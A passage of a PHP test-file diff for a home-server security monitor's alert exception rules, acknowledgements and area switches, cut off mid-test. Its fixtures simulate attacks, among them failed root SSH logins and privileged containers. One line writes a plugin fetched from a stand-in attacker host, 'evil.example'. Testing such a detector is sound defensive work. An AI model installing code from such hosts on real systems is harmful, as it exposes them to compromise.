@@ -22248,6 +22248,252 @@ function testWatchmanWear(): void
 }
 
 /**
+ * The night watchman's exceptions and areas switched off (1.96 step 4, agent/desks/watchman-rules.php): every kind either
+ * asked about more clearly or not; every rule shape — what it covers and what not; the offers a click may make (narrow
+ * only, a net only for a private address, never failures or a new SMB user by a net); the pass (noted by the rule, the
+ * same again one line, never a chain forming, never `again` older than the decision, an area off made normal and left
+ * out); a real round (let through, not told, counted; outside the net told; lifted: told again; without rules.json — an
+ * older office — told again: louder, never quieter); the night's copy (foreign v: none); the actions (asked more
+ * clearly, undo, an area off and on, the Team Lead's hint); rules.json tolerant (unknown keys and rules kept).
+ */
+function testWatchmanRules(): void
+{
+    same('rules: every kind either asked about more clearly or not — none in both, none forgotten', [[], []],
+        [array_values(array_diff(array_keys(WATCH_KINDS), WATCH_RULE_ASK, WATCH_RULE_PLAIN)), array_values(array_intersect(WATCH_RULE_ASK, WATCH_RULE_PLAIN))]);
+    same('rules: … and neither list names a kind he doesn\'t have', [], array_values(array_diff(array_merge(WATCH_RULE_ASK, WATCH_RULE_PLAIN), array_keys(WATCH_KINDS))));
+
+    // the shapes: only exactly one of them
+    same('rules: the shapes of `on`', [['key' => 'login_failures:1.2.3.4'], ['ip' => '203.0.113.7'], ['net' => '192.168.1.0/24'], ['user' => 'root', 'net' => '192.168.1.0/24'],
+        ['machine' => 'LAPTOP'], ['net' => 'fd00:1:2:3::/64'], null, null, null, null, null, null, null],
+        array_map('watchmanRuleOn', [['key' => 'login_failures:1.2.3.4'], ['ip' => '203.0.113.7'], ['net' => '192.168.1.0/24'], ['net' => '192.168.1.0/24', 'user' => 'root'],
+            ['machine' => 'LAPTOP'], ['net' => 'fd00:1:2:3::/64'], ['net' => '192.168.1.7/24'], ['net' => '192.168.1.0/33'], ['ip' => 'nope'], ['key' => ''],
+            ['user' => 'ro ot', 'net' => '10.0.0.0/8'], ['ip' => '1.2.3.4', 'net' => '1.2.3.0/24'], 'x']));
+    $rule = fn (array $on, array $kinds, string $cat = 'login', int $at = 1000) => watchmanRuleShaped(['id' => 'r' . substr(md5(json_encode([$on, $kinds, $at])), 0, 10),
+        'cat' => $cat, 'kinds' => $kinds, 'on' => $on, 'at' => $at]);
+    $e = fn (string $kind, string $key, array $p) => watchmanEntry($kind, $key, 2000, $p);
+    $login = fn (string $ip, array $users = ['root']) => $e('login_new_ip', "login_new_ip:$ip", ['ip' => $ip, 'users' => $users, 'services' => ['web']]);
+    $cases = [
+        // [what, rule on, rule kinds, entry, covers?]
+        ['key: exactly this thing', ['key' => 'login_new_ip:192.168.1.7'], ['login_new_ip'], $login('192.168.1.7'), true],
+        ['key: another thing of the kind', ['key' => 'login_new_ip:192.168.1.7'], ['login_new_ip'], $login('192.168.1.8'), false],
+        ['key: the same key, another kind', ['key' => 'login_failures:192.168.1.7'], ['login_failures'], $e('login_new_ip', 'login_failures:192.168.1.7', ['ip' => '192.168.1.7']), false],
+        ['ip: the address', ['ip' => '203.0.113.7'], WATCH_RULE_LOGIN, $login('203.0.113.7'), true],
+        ['ip: another address', ['ip' => '203.0.113.7'], WATCH_RULE_LOGIN, $login('203.0.113.8'), false],
+        ['ip: failures from it — not its kinds', ['ip' => '203.0.113.7'], WATCH_RULE_LOGIN, $e('login_failures', 'login_failures:203.0.113.7', ['ip' => '203.0.113.7']), false],
+        ['net: an address in it', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $login('192.168.1.200'), true],
+        ['net: an SMB machine in it', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('smb_client', 'smb_client:192.168.1.9', ['ip' => '192.168.1.9', 'users' => ['benj']]), true],
+        ['net: an SMB session at an odd hour in it', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('smb_hour', 'smb_hour:192.168.1.9', ['ip' => '192.168.1.9']), true],
+        ['net: an address outside', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $login('192.168.2.1'), false],
+        ['net: a burst of failures from inside — never by a net', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('login_failures', 'login_failures:192.168.1.5', ['ip' => '192.168.1.5']), false],
+        ['net: a new SMB user from inside — never by a net', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('smb_user', 'smb_user:eve', ['user' => 'eve', 'ip' => '192.168.1.5']), false],
+        ['net: an entry without an address', ['net' => '192.168.1.0/24'], WATCH_RULE_LOGIN, $e('login_new_ip', 'login_new_ip:x', []), false],
+        ['net: IPv6 in its /64', ['net' => 'fd00:1:2:3::/64'], WATCH_RULE_LOGIN, $login('fd00:1:2:3::99'), true],
+        ['net: IPv6 outside', ['net' => 'fd00:1:2:3::/64'], WATCH_RULE_LOGIN, $login('fd00:1:2:4::99'), false],
+        ['net: IPv4 against an IPv6 net', ['net' => 'fd00:1:2:3::/64'], WATCH_RULE_LOGIN, $login('192.168.1.1'), false],
+        ['user and net: root from inside', ['user' => 'root', 'net' => '192.168.1.0/24'], ['login_new_ip'], $login('192.168.1.7', ['root']), true],
+        ['user and net: another user', ['user' => 'root', 'net' => '192.168.1.0/24'], ['login_new_ip'], $login('192.168.1.7', ['benj']), false],
+        ['user and net: root and another user', ['user' => 'root', 'net' => '192.168.1.0/24'], ['login_new_ip'], $login('192.168.1.7', ['root', 'benj']), false],
+        ['user and net: root from outside', ['user' => 'root', 'net' => '192.168.1.0/24'], ['login_new_ip'], $login('10.0.0.7', ['root']), false],
+        ['machine: at any hour', ['machine' => 'LAPTOP'], ['smb_hour'], $e('smb_hour', 'smb_hour:192.168.1.9', ['ip' => '192.168.1.9', 'machine' => 'LAPTOP']), true],
+        ['machine: another machine', ['machine' => 'LAPTOP'], ['smb_hour'], $e('smb_hour', 'smb_hour:192.168.1.9', ['ip' => '192.168.1.9', 'machine' => 'DESK']), false],
+    ];
+    foreach ($cases as [$what, $on, $kinds, $entry, $want]) {
+        $r = $rule($on, $kinds);
+        same("rules: covers — $what", $want, $r !== null && watchmanRuleCovers($r, $entry));
+    }
+    same('rules: a kind outside the area\'s is no rule at all', null, $rule(['key' => 'x'], ['plugin_new']));
+
+    // the offers: narrow only
+    $types = fn (array $entry, array $book = []) => array_map(fn ($o) => [$o['type'], $o['ask']], watchmanRuleOffers($entry, $book ?: [$entry]));
+    same('offers: a login from a private address, one user — the user from its /24, the /24, this one', [['user_net', false], ['net', false], ['key', false]], $types($login('192.168.1.7')));
+    same('offers: … the net is the address\'s /24 (IPv6: /64)', ['192.168.1.0/24', 'fd00:1:2:3::/64'],
+        [watchmanRuleOffers($login('192.168.1.7'), [])[1]['on']['net'] ?? null, watchmanRuleOffers($login('fd00:1:2:3::99'), [])[1]['on']['net'] ?? null]);
+    same('offers: a public address — only itself, and this one', [['ip', false], ['key', false]], $types($login('203.0.113.7')));
+    same('offers: failures — only this one, asked more clearly', [['key', true]], $types($e('login_failures', 'login_failures:192.168.1.5', ['ip' => '192.168.1.5'])));
+    same('offers: an SMB session at an odd hour — the machine first', [['machine', false], ['net', false], ['key', false]],
+        $types($e('smb_hour', 'smb_hour:192.168.1.9', ['ip' => '192.168.1.9', 'users' => ['benj'], 'machine' => 'LAPTOP'])));
+    same('offers: a change of go (any area: «this one») — asked more clearly', [['key', true]], $types($e('flash_go', 'flash_go', ['lines' => ['x']])));
+    $noted = $login('192.168.1.7');
+    $noted['noted'] = 1;
+    same('offers: none on an entry noted already, none on his own lines', [[], []], [watchmanRuleOffers($noted, []), watchmanRuleOffers(['kind' => 'watch', 'key' => 'x'] + $login('1.2.3.4'), [])]);
+    $book = [$login('192.168.1.7'), $login('192.168.1.8'), $login('192.168.2.8')];
+    same('offers: how many open entries each would cover (root from the /24: both of root\'s logins there)', [2, 2, 1], array_column(watchmanRuleOffers($book[0], $book), 'covers'));
+
+    // the pass
+    $now = 5000;
+    $rules = fn (array $list, array $off = []) => watchmanRules(['rules' => $list, 'off' => $off]);
+    $net = ['id' => 'r0000000001', 'cat' => 'login', 'kinds' => WATCH_RULE_LOGIN, 'on' => ['net' => '192.168.1.0/24'], 'at' => 1000];
+    $pass = function (array $book, array $before, array $rs, array $inc = [], ?array &$b = null, ?array &$st = null) use ($now): array {
+        $b ??= ['ips' => [], 'fail_ips' => []];
+        $st ??= [];
+        $res = watchmanRulesApply($book, $before, $b, [], $rs, $inc, $st, $now);
+        return [$book, $res];
+    };
+    $st = [];
+    [$bk, $res] = $pass([$login('192.168.1.7'), $login('192.168.2.7')], [], $rules([$net]), [], $b, $st);
+    same('pass: the one in the net noted by the rule (by rule, its id), the other open; a hit counted', [['rule', 'r0000000001', false], [null, null, true], ['noted' => 1, 'merged' => 0, 'off' => 0, 'known' => 0, 'quiet' => 0], 1],
+        [[$bk[0]['by'], $bk[0]['rule'], watchmanOpen($bk[0])], [$bk[1]['by'], $bk[1]['rule'] ?? null, watchmanOpen($bk[1])], $res, $st['rule_hits']['r0000000001']['n'] ?? 0]);
+    same('pass: noted by the rule is never told (watchmanNotifyDue sees only the open one)', ['192.168.2.7'],
+        (function () use ($bk) { $book = $bk; $s = []; watchmanNotifyDue($book, $s, 9000, false); return array_values(array_map(fn ($e) => $e['p']['ip'], array_filter($book, fn ($e) => !empty($e['told']) || (watchmanOpen($e) && $e['kind'] === 'login_new_ip')))); })());
+    $again = $login('192.168.1.7');
+    $again['count'] = 3;
+    [$bk2] = $pass(array_merge($bk, [$again]), array_flip(array_column($bk, 'id')), $rules([$net]), [], $b, $st);
+    same('pass: the same thing again brings the rule\'s line up to date — no second line', [2, 4, 2], [count($bk2), $bk2[0]['count'], $st['rule_hits']['r0000000001']['n']]);
+    [$bk3, $r3] = $pass([$login('192.168.1.7')], [], watchmanRules([]));
+    same('pass: no rules — nothing changes', [true, ['noted' => 0, 'merged' => 0, 'off' => 0, 'known' => 0, 'quiet' => 0]], [watchmanOpen($bk3[0]), $r3]);
+    $inc = $login('192.168.1.7');
+    $inc['again'] = 'wincident01';
+    [$bk4] = $pass([$inc], [], $rules([$net]), ['wincident01' => 1500]);
+    $later = ['at' => 1600] + $net;
+    [$bk5] = $pass([$inc], [], $rules([$later]), ['wincident01' => 1500]);
+    same('pass: the same as a serious incident — not by an older rule, by one made after it (your newest decision)', [true, false], [watchmanOpen($bk4[0]), watchmanOpen($bk5[0])]);
+    $cron = $e('cron_new', 'cron_new:x', ['line' => '* * * * * x']);
+    $cron['time'] = $cron['last'] = $now - 10;
+    $acc = $login('192.168.1.7');
+    $acc['time'] = $acc['last'] = $now - 20;
+    [$bk6] = $pass([$acc, $cron], [], $rules([$net]));
+    same('pass: a login that forms a chain with a new cron line stays open — the chain is told', [true, true], [watchmanOpen($bk6[0]), watchmanOpen($bk6[1])]);
+    $bOff = ['ips' => [], 'fail_ips' => []];
+    $stOff = [];
+    [$bk7, $r7] = $pass([$login('192.168.9.9'), $e('plugin_new', 'plugin_new:x', ['name' => 'x', 'source' => 's'])], [], $rules([], ['login' => ['at' => 1000]]), [], $bOff, $stOff);
+    same('pass: an area switched off — its new entry left out and made normal, the others as before', [['plugin_new'], ['192.168.9.9'], 1],
+        [array_column($bk7, 'kind'), array_keys($bOff['ips']), $r7['off']]);
+
+    // rules.json: tolerant, bounded
+    $raw = ['v' => 1, 'future' => ['x' => 1], 'rules' => [$net, ['id' => 'r0000000002', 'cat' => 'login', 'kinds' => ['login_new_ip'], 'on' => ['vlan' => 7], 'at' => 1], 'junk'],
+            'off' => ['login' => ['at' => 5], 'nope' => ['at' => 1]]];
+    same('rules.json: only rules in exactly their shape apply, unknown areas switched off none', [['r0000000001'], ['login' => 5]],
+        [array_column(watchmanRules($raw)['rules'], 'id'), watchmanRules($raw)['off']]);
+    $many = array_map(fn ($i) => ['id' => sprintf('r%010x', $i), 'cat' => 'login', 'kinds' => ['login_new_ip'], 'on' => ['key' => "k$i"], 'at' => 1], range(1, 60));
+    same('rules.json: 50 rules per area at most', 50, count(watchmanRules(['rules' => $many])['rules']));
+
+    // a real round
+    $tmp = hardeningTmp('watch-rules');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    $t0 = strtotime('2026-11-20 10:00:00');
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    file_put_contents($paths['syslog'], $line($t0 - 3600, 'webgui: Successful login user root from 192.168.20.10'));
+    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
+    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\n");
+    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
+    file_put_contents($paths['sec'], "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n");
+    file_put_contents($paths['sec_nfs'], "");
+    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\nshareNFSEnabled=\"no\"\n");
+    $docker = fn () => [];
+    $notified = "$tmp/notified";
+    file_put_contents("$tmp/notify", "#!/bin/bash\necho \"\$@\" >> " . escapeshellarg($notified) . "\n");
+    chmod("$tmp/notify", 0755);
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
+    $told = fn () => substr_count((string) @file_get_contents($notified), ' -l /');       // one per notification (its link)
+    $login = fn (int $t, string $ip) => file_put_contents($paths['syslog'], $line($t, "webgui: Successful login user root from $ip"), FILE_APPEND);
+    $byIp = fn () => array_map(fn ($x) => [$x['p']['ip'], $x['by'], $x['count']], array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'login_new_ip')));
+    watchmanRound($paths, $data, 1000, $t0, $docker, true, "$tmp/acks.json");
+    file_put_contents("$data/rules.json", json_encode(['v' => 1, 'rules' => [['id' => 'r00000000aa', 'cat' => 'login', 'kinds' => WATCH_RULE_LOGIN, 'on' => ['net' => '192.168.50.0/24'],
+        'at' => $t0, 'from' => 'hand', 'note' => 'the kids\' tablets']], 'keep' => 'this']));
+    $login($t0 + 100, '192.168.50.7');
+    watchmanRound($paths, $data, 1000, $t0 + 300, $docker, true, "$tmp/acks.json");
+    same('round: a login from the net let through — noted by the rule, nothing told, counted', [[['192.168.50.7', 'rule', 1]], 0, 1],
+        [$byIp(), $told(), watchmanLoad($data)['state']['rule_hits']['r00000000aa']['n'] ?? 0]);
+    $login($t0 + 400, '192.168.50.7');
+    $login($t0 + 410, '192.168.60.9');
+    watchmanRound($paths, $data, 1000, $t0 + 600, $docker, true, "$tmp/acks.json");
+    same('round: again from it — the same line counts up; from outside the net — open and told', [[['192.168.50.7', 'rule', 2], ['192.168.60.9', null, 1]], 1],
+        [$byIp(), $told()], (string) @file_get_contents($notified));
+    $pg = watchmanPageState($data, $t0 + 600, false);
+    same('page: the rule with its hits, the line noted by it, the offers on the open one', [1, 2, 'r00000000aa', ['user_net', 'net', 'key']],
+        [count($pg['rules']), $pg['rules'][0]['hits'], array_values(array_filter($pg['book'], fn ($x) => ($x['by'] ?? null) === 'rule'))[0]['rule'] ?? null,
+         array_column(array_values(array_filter($pg['book'], fn ($x) => $x['open']))[0]['offers'] ?? [], 'type')]);
+    // the night shift counts its own hits from none (its state is made anew): at the handover they add to the day's
+    $hd = watchmanNightState(['rule_hits' => ['r00000000aa' => ['n' => 2, 'last' => $t0 + 600, 'key' => 'day'], 'r00000000bb' => ['n' => 1, 'last' => $t0 + 50, 'key' => 'b']]],
+        ['rule_hits' => ['r00000000aa' => ['n' => 3, 'last' => $t0 + 5000, 'key' => 'night'], 'r00000000cc' => ['n' => 1, 'last' => $t0 + 4000, 'key' => 'c'],
+                         'r00000000dd' => ['n' => 0, 'last' => $t0], 7 => ['n' => 4], 'r00000000ee' => 'x']], $t0 + 6000);
+    same('handover: the night\'s rule hits added to the day\'s (newest time and words), a rule only the night met joins, nothing odd taken',
+        ['r00000000aa' => ['n' => 5, 'last' => $t0 + 5000, 'key' => 'night'], 'r00000000bb' => ['n' => 1, 'last' => $t0 + 50, 'key' => 'b'],
+         'r00000000cc' => ['n' => 1, 'last' => $t0 + 4000, 'key' => 'c']], $hd['rule_hits']);
+    same('handover: a night without hits leaves the day\'s as they are', ['r00000000aa' => ['n' => 2]], watchmanNightState(['rule_hits' => ['r00000000aa' => ['n' => 2]]], [], $t0)['rule_hits']);
+    watchmanMirrorWrite($data, "$tmp/mirror.json", null, $t0 + 650, 'boot-a');
+    @mkdir("$tmp/night", 0700);
+    watchmanNightBegin($paths, "$tmp/night", $t0 + 700, "$tmp/mirror.json", null, 'boot-a');
+    same('night begin: the day has hits, the night\'s state none (else they would count twice at the handover)', [true, false],
+        [isset(watchmanLoad($data)['state']['rule_hits']['r00000000aa']), isset(watchmanLoad("$tmp/night")['state']['rule_hits'])]);
+    // an older office on this data folder: no rules.json read — it tells again (louder, never quieter); its lines stay noted
+    rename("$data/rules.json", "$tmp/rules.json");
+    $login($t0 + 700, '192.168.50.7');
+    watchmanRound($paths, $data, 1000, $t0 + 900, $docker, true, "$tmp/acks.json");
+    same('round without rules.json (as an older office): told again, the rule\'s line still noted', [[['192.168.50.7', 'rule', 2], ['192.168.60.9', null, 1], ['192.168.50.7', null, 1]]],
+        [$byIp()]);
+    rename("$tmp/rules.json", "$data/rules.json");
+
+    // the actions (as the page sends them)
+    $open = array_values(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'));
+    $ip60 = array_values(array_filter($open, fn ($x) => ($x['p']['ip'] ?? '') === '192.168.60.9'))[0];
+    $res = watchmanRuleAdd($ip60['id'], 'net', false, $data, $t0 + 1000, false);
+    $raw = watchmanRulesRaw($data);
+    same('rule_add: the /24 from the entry as it is now (never a net from the page), the entry noted, unknown keys kept', ['192.168.60.0/24', 1, 'this', $ip60['id']],
+        [$raw['rules'][1]['on']['net'] ?? null, $res['noted'], $raw['keep'] ?? null, $raw['rules'][1]['from'] ?? null]);
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('rule_add: an entry not open, a type not offered, a bad id — refused', ['watch_gone', 'bad_request', 'bad_request'],
+        [$err(fn () => watchmanRuleAdd($ip60['id'], 'net', false, $data, null, false)),
+         $err(fn () => watchmanRuleAdd(array_values(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'))[0]['id'], 'vlan', false, $data, null, false)),
+         $err(fn () => watchmanRuleAdd('x', 'net', false, $data, null, false))]);
+    file_put_contents($paths['syslog'], implode('', array_map(fn ($i) => $line($t0 + 1100 + $i, 'sshd[7]: Failed password for root from 192.168.50.66 port ' . (4000 + $i) . ' ssh2'), range(0, 6))), FILE_APPEND);
+    watchmanRound($paths, $data, 1000, $t0 + 1200, $docker, true, "$tmp/acks.json");
+    $fail = array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'login_failures' && watchmanOpen($x)));
+    same('round: a burst of failures from inside the net — never covered by it, open', 1, count($fail));
+    same('rule_add: failures asked about more clearly — without the clear yes refused, with it made', ['watch_rule_ask', 1],
+        [$err(fn () => watchmanRuleAdd($fail[0]['id'], 'key', false, $data, null, false)), watchmanRuleAdd($fail[0]['id'], 'key', true, $data, $t0 + 1300, false)['noted']]);
+    $rid = watchmanRulesRaw($data)['rules'][2]['id'];
+    same('rule_remove: undo — the rule gone, its entry open again', [1, true],
+        [watchmanRuleRemove($rid, true, $data, false)['reopened'], watchmanOpen(array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['id'] === $fail[0]['id']))[0])]);
+    same('rule_remove: lifting one not there', 'watch_rule_gone', $err(fn () => watchmanRuleRemove($rid, false, $data, false)));
+    watchmanRuleRemove('r00000000aa', false, $data, false);
+    $login($t0 + 1400, '192.168.50.7');
+    watchmanRound($paths, $data, 1000, $t0 + 1500, $docker, true, "$tmp/acks.json");
+    same('lifted: the next login from that net is open again (the baseline never learnt it)', true,
+        (bool) array_filter(watchmanLoad($data)['book'], fn ($x) => ($x['p']['ip'] ?? '') === '192.168.50.7' && watchmanOpen($x)));
+    same('cat_off: off only with the clear yes', 'watch_rule_ask', $err(fn () => watchmanCatOff('plugin', true, false, $data, null, false)));
+    watchmanCatOff('plugin', true, true, $data, $t0 + 1600, false);
+    file_put_contents("$src/plugins/new.plg", "<PLUGIN name=\"new\" version=\"1\" pluginURL=\"https://evil.example/new.plg\">\n");
+    $toldBefore = $told();
+    watchmanRound($paths, $data, 1000, $t0 + 1800, $docker, true, "$tmp/acks.json");
+    $d = watchmanLoad($data);
+    same('area off: a new plugin — nothing in the book, nothing told, made normal underneath', [[], 0, true],
+        [array_values(array_filter($d['book'], fn ($x) => $x['kind'] === 'plugin_new')), $told() - $toldBefore, isset($d['baseline']['plugins']['new'])]);
+    $pg = watchmanPageState($data, $t0 + 1800, false);
+    same('area off: grey, «off» said, when; the Team Lead\'s hint', ['none', 'off', $t0 + 1600, true],
+        [$pg['cats']['plugin']['level'], $pg['cats']['plugin']['why'][0] ?? null, $pg['cats']['plugin']['off'] ?? null,
+         in_array('areas_off', array_column(watchmanChecks($data), 'id'), true)]);
+    watchmanCatOff('plugin', false, false, $data, $t0 + 1900, false);
+    watchmanRound($paths, $data, 1000, $t0 + 2100, $docker, true, "$tmp/acks.json");
+    same('area on again: from now — no backlog of what came while it was off', [[], false],
+        [array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'plugin_new')), in_array('areas_off', array_column(watchmanChecks($data), 'id'), true)]);
+
+    // the night shift's copy
+    watchmanRuleAdd(array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => watchmanOpen($x) && $x['kind'] === 'login_new_ip'))[0]['id'], 'key', false, $data, $t0 + 2200, false);
+    watchmanRulesCopy($data, "$tmp/ram-rules.json", "$tmp/flash/rules.json");
+    $copy = readJson("$tmp/ram-rules.json");
+    same('night copy: what applies (the two rules there are), no notes; the flash only where its folder is', [1, 2, false, false],
+        [$copy['v'] ?? null, count($copy['rules'] ?? []), str_contains((string) json_encode($copy), 'note'), is_file("$tmp/flash/rules.json")]);
+    @mkdir("$tmp/night", 0700, true);
+    watchmanRulesNight("$tmp/night", "$tmp/ram-rules.json", null);
+    same('night: the RAM copy becomes the night\'s rules.json', 2, count(watchmanRules(watchmanRulesRaw("$tmp/night"))['rules']));
+    file_put_contents("$tmp/ram-rules.json", json_encode(['v' => 2, 'rules' => []]));
+    watchmanRulesNight("$tmp/night", "$tmp/ram-rules.json", null);
+    same('night: a copy of another shape — no rules at all (louder, never quieter)', false, is_file("$tmp/night/rules.json"));
+
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    hardeningRm($tmp);
+}
+
+/**
  * The hardware's kinds in book-more.json (1.96 steps 9–11; the split itself: testWatchmanBookMore): every hardware kind is in
  * WATCH_KINDS_MORE, and every kind an office of 1.95 doesn't know too (the kinds of 1.95 held here) — else an older office
  * would drop it from book.json; a hardware entry lands there and reads back; the night shift begins from the mirror with
@@ -22287,6 +22533,922 @@ function testWatchmanHwBookMore(): void
     $begun = watchmanNightBegin([], $night, $now, "$tmp/mirror.json", null, 'boot-x');
     same('hw book more: the night begun from the mirror — the open machine check with it (once), no stale book-more.json', ['ram', [$login['id'], $mce['id']], false],
         [$begun['from'] ?? null, array_column(watchmanLoad($night)['book'], 'id'), is_file("$night/book-more.json")]);
+    hardeningRm($tmp);
+}
+
+/**
+ * «I know, thanks» holds until taken back (1.96 step 4b, agent/desks/watchman-rules.php, concept 3.4): a lasting answer
+ * kept in rules.json `known` with the fingerprint of the thing as it was; a container gone 41 days and back unchanged —
+ * no question; back with a right more — asked, the entry says when you knew it; an address pushed out of the baseline
+ * (the 500) and back — no question; «Take back» — it comes out of the baseline, told again; an event keeps no answer;
+ * a data flow only within its peak then; an older office (no `known` read) asks again as before.
+ */
+function testWatchmanKnown(): void
+{
+    same('known: the events are kinds he has, and an event never lasts', [[], false, true],
+        [array_values(array_diff(WATCH_ACK_EVENTS, array_keys(WATCH_KINDS))), watchmanAckLasts('log_cleared'), watchmanAckLasts('container_new')]);
+    $tmp = hardeningTmp('watch-known');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    $t0 = strtotime('2026-09-01 10:00:00');
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    file_put_contents($paths['syslog'], $line($t0 - 3600, 'webgui: Successful login user root from 192.168.20.10'));
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n");
+    file_put_contents($paths['sec'], "");
+    file_put_contents($paths['sec_nfs'], "");
+    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\n");
+    $containers = [];
+    $docker = function () use (&$containers) { return $containers; };
+    $notified = "$tmp/notified";
+    file_put_contents("$tmp/notify", "#!/bin/bash\necho \"\$@\" >> " . escapeshellarg($notified) . "\n");
+    chmod("$tmp/notify", 0755);
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
+    $told = fn () => substr_count((string) @file_get_contents($notified), ' -l /');
+    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $t, $docker, true, "$tmp/acks.json");
+    $of = fn (string $kind) => array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === $kind));
+    $round($t0);
+
+    // a container with a right: told, answered — kept as known with its fingerprint
+    $containers = ['vpn' => ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--network=host']]];
+    $round($t0 + 300);
+    $e = $of('container_host')[0] ?? $of('container_new')[0] ?? null;
+    check('known: a new container with rights — an entry', $e !== null && watchmanOpen($e), json_encode(array_column(watchmanLoad($data)['book'], 'kind')));
+    watchmanAck($e['id'], $data, $t0 + 400, false);
+    $known = watchmanKnown(watchmanRulesRaw($data));
+    same('known: the answer kept — the kind, its key, a fingerprint, when', [1, $e['kind'], $e['key'], 16, $t0 + 400],
+        [count($known), $known[0]['kind'] ?? null, $known[0]['key'] ?? null, strlen($known[0]['sig'] ?? ''), $known[0]['at'] ?? null]);
+    // gone 41 days: the baseline forgets it (WATCH_FORGET) — back as it was: no question
+    $containers = [];
+    $round($t0 + 1000);
+    $round($t0 + 41 * 86400);
+    check('known: gone over 30 days — the baseline forgot it', !isset(watchmanLoad($data)['baseline']['containers']['vpn']));
+    $containers = ['vpn' => ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--network=host']]];
+    $before = $told();
+    $round($t0 + 41 * 86400 + 300);
+    $back = array_values(array_filter($of($e['kind']), fn ($x) => (int) $x['time'] >= $t0 + 41 * 86400));
+    same('known: back as it was — noted by himself (you knew it), not told, normal again', [1, 'known', false, 0, true],
+        [count($back), $back[0]['by'] ?? null, isset($back[0]) && watchmanOpen($back[0]), $told() - $before, isset(watchmanLoad($data)['baseline']['containers']['vpn'])]);
+    // gone again, back with a right more: asked — and the entry says when you knew it as it was
+    $containers = [];
+    $round($t0 + 42 * 86400);
+    $round($t0 + 83 * 86400);
+    $containers = ['vpn' => ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--network=host', '--privileged']]];
+    $round($t0 + 83 * 86400 + 300);
+    $more = array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => str_starts_with($x['kind'], 'container_') && watchmanOpen($x)));
+    same('known: back with a right more — open, told, it says when you knew it', [true, $t0 + 400],
+        [count($more) > 0 && $told() > $before, $more[0]['p']['known_at'] ?? null]);
+    watchmanAck(array_column($more, 'id'), $data, $t0 + 83 * 86400 + 400, false);
+
+    // an address pushed out of the baseline (its 500) and back: no question
+    file_put_contents($paths['syslog'], $line($t0 + 84 * 86400, 'webgui: Successful login user root from 10.1.1.1'), FILE_APPEND);
+    $round($t0 + 84 * 86400 + 300);
+    $ip = array_values(array_filter($of('login_new_ip'), 'watchmanOpen'))[0];
+    watchmanAck($ip['id'], $data, $t0 + 84 * 86400 + 400, false);
+    $b = readJson("$data/baseline.json");
+    unset($b['ips']['10.1.1.1']);                            // as when 500 others pushed it out
+    file_put_contents("$data/baseline.json", json_encode($b));
+    file_put_contents($paths['syslog'], $line($t0 + 85 * 86400, 'webgui: Successful login user root from 10.1.1.1'), FILE_APPEND);
+    $before = $told();
+    $round($t0 + 85 * 86400 + 300);
+    same('known: an address pushed out and back — noted by himself, nothing told', [[], 0],
+        [array_values(array_filter($of('login_new_ip'), 'watchmanOpen')), $told() - $before]);
+    // an older office: no `known` read — it asks as it did
+    rename("$data/rules.json", "$tmp/rules.json");
